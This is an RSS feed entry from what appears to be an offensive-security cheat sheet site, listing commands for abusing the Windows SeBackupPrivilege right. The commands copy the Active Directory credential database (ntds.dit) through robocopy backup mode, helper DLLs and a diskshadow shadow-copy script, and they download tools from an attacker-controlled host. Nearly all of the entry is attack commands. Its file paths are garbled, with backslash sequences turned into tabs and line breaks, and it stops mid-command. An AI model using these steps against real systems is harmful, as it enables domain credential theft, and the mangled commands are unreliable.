channel.title: Diskshadow on TLDRBins
channel.description: Recent content in Diskshadow on TLDRBins

item.title: SeBackupPrivilege/SeRestorePrivilege
item.description:
Abuse #1: Robocopy robocopy /b <TARGET_DIR_PATH> <DEST_DIR> <TARGET_FILE> Abuse #2: Use Helper DLLs 1. Import Helper Modules import-module .\SeBackupPrivilegeCmdLets.dll import-module .\SeBackupPrivilegeUtils.dll 2. Copy Target File Copy-FileSeBackupPrivilege '<TARGET_FILE_PATH>' 'C:\ProgramData\<TARGET_FILE>' Copy-FileSeBackupPrivilege C:\Windows
tds
tds.dit C:\ProgramData
tds.dit Ref: SeBackupPrivilegeUtils.dll Ref: SeBackupPrivilegeCmdLets.dll Abuse #3: Diskshadow 1. Create a .dsh File set context persistent nowriters set metadata C:\ProgramData	est.cab set verbose on add volume c: alias test create expose %test% x: 2. Convert to DOS Format unix2dos vss.dsh 3. Upload Helpers iwr http://<LOCAL_IP>:<LOCAL_PORT>/SeBackupPrivilegeCmdLets.
